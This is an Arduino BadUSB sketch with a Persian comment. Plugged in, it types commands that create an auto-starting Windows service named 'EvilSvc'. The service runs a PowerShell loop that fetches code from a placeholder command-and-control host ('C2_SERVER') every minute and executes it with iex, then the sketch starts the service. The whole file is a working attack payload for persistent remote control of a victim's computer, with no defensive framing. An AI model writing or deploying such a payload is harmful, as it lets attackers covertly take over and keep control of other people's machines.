#include <USBHIDKeyboard.h>
USBHIDKeyboard Keyboard;

void setup() {
  Keyboard.begin();
  delay(3000);
  
  // ایجاد سرویس ویندوزی با ارتباط به سرور C2
  Keyboard.println(F("sc create EvilSvc binPath= \"powershell -nop -c while(1){irm http://C2_SERVER/api?key=$(Get-Random)|iex; sleep 60}\" start= auto"));
  Keyboard.println(F("sc start EvilSvc"));
}
